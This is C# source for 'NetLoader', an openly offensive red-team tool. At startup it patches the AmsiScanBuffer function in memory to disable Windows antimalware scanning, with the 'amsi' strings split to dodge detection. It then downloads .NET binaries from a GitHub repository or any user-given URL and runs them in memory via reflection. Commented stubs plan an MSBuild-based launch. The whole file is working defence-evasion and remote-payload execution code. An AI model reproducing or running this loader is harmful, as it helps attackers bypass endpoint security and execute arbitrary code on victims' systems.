using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;

//This if for MSBuild LOL bin stuff later
//using Microsoft.Build.Framework;
//using Microsoft.Build.Utilities;
public class TotallyNotNt
{
    static WebClient webClient = new WebClient() { };
    static string _repURL = "https://github.com/Flangvik/NetLoader/tree/master/Binaries";

    public static void Main(string[] args)
    {
        string bannerArt = @"                
                \||/
                | @___oo
      /\  /\   / (__,,,,|
     ) / ^\) ^\/ _)
     )   / ^\/ _)
     )   _ /  / _)
 /\  )/\/ ||  | )_)
<  >      | (,,) )__)
 ||      /    \)___)\
 | \____()___) )___
  \______(_______; ; ; __; ; ;  
~Flangvik  #NetLoader
";
        Console.WriteLine(bannerArt);
        MoveLifeAhead(System.Environment.Is64BitOperatingSystem);

        while (true)
        {
            try
            {
                ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;

                List<string> binList = GetBins();


                Console.WriteLine("------------------------");
                Console.WriteLine("[0] - Exit NetLoader");
                for (int count = 0; count < binList.Count; count++)
                {
                    Console.WriteLine("[" + (count + 1) + "] - " + binList[count]);

                    if (count == binList.Count - 1)
                    {
                        Console.WriteLine("[" + (count + 2) + "] - Custom PATH or URL ");
                    }
                }
                Console.WriteLine("-----------------------");
                Console.WriteLine("[+] Select a binary (number)>");

                int selectedBin = Convert.ToInt32(Console.ReadLine());

                if (selectedBin == 0)
                {
                    System.Environment.Exit(1);

                }
                else if (selectedBin - 1 == binList.Count)
                {
                    Console.WriteLine("[+] Input your own URL / Local Path / direct link to binary");
                    string binUrl = Console.ReadLine();

                    Console.WriteLine("[+] Provide arguments for {0} >", binUrl);
                    string binArgs = Console.ReadLine();
                    invokeBinary("", binArgs, binUrl, false);


                }
                else if (selectedBin - 1 > binList.Count | selectedBin - 1 < 0)
                {
                    Console.WriteLine("[!] Not a valid selection!");
                }
                else
                {
                    Console.WriteLine("[+] Provide arguments for {0} >", binList[selectedBin - 1]);
                    string binArgs = Console.ReadLine();
                    invokeBinary(binList[selectedBin - 1], binArgs);
                }

            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Something went wrong, not going to handle it..");
                Console.WriteLine("[!] {0}", ex.Message);
                Console.WriteLine("[!] {0}", ex.InnerException);
            }
        }
    }



    public static void invokeBinary(string binName, string arguments = "", string customUrl = "", bool gitHub = true)
    {
        byte[] binarySource = new byte[] { };

        if (gitHub)
        {
            binarySource = webClient.DownloadData(_repURL.Replace("tree", "blob") + "/" + binName + "?raw=true");
        }
        else
        {
            if (customUrl.StartsWith("http") && !customUrl.StartsWith("\\\\"))
            {
                binarySource = webClient.DownloadData(customUrl);
            }
            else
            {
                binarySource = File.ReadAllBytes(customUrl);

            }

        }



        System.Reflection.Assembly.Load(binarySource).EntryPoint.Invoke(0, new object[] { new string[] { arguments } });

    }
    public static List<string> GetBins()
    {
        Console.WriteLine("[+] Fetching list of bins from " + _repURL);
        var avBinaries = new List<string>() { };
        var websiteSource = webClient.DownloadString(_repURL);
        string pattern = @"\/[A-Za-z]{0,50}\.bin";

        Regex rgx = new Regex(pattern, RegexOptions.IgnoreCase);
        MatchCollection matches = rgx.Matches(websiteSource);
        foreach (var match in matches)
        {
            avBinaries.Add(match.ToString().TrimStart('/'));
        }

        return avBinaries;

    }
    private static void MoveLifeAhead(bool BigBoy = false)
    {
        try
        {
            if (BigBoy)
            {
                Console.WriteLine("[+] Patching AM" + "SI ...");

                uint someNumber = 0;
                IntPtr addr = WinLibBase.GetProcAddress(WinLibBase.LoadLibrary("am" + "si.dll"), "Am" + "siSca" + "nBuffer");
                WinLibBase.VirtualProtect(addr, (UIntPtr)new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }.Length, 0x40, out someNumber);

                Marshal.Copy(new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }, 0, addr, new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }.Length);

                Console.WriteLine("[+] Patched!");
            }
            else
            {
                Console.WriteLine("[+] Patching AM" + "SI ...");

                uint someNumber = 0;
                IntPtr addr = WinLibBase.GetProcAddress(WinLibBase.LoadLibrary("am" + "si.dll"), "Am" + "siSca" + "nBuffer");
                WinLibBase.VirtualProtect(addr, (UIntPtr)new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 }.Length, 0x40, out someNumber);

                Marshal.Copy(new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 }, 0, addr, new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 }.Length);

                Console.WriteLine("[+] Patched!");

            }


        }
        catch (Exception ex)
        {
            Console.WriteLine("[!] {0}", ex.Message);
            Console.WriteLine("[!] {0}", ex.InnerException);
        }
    }


}

public class WinLibBase
{
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}

/*
 //This is for MSBuild later
public class ClassExample : Task, ITask
{
    public override bool Execute()
    {
        NetLoader.Main(new string[] { });
        return true;
    }
}
*/
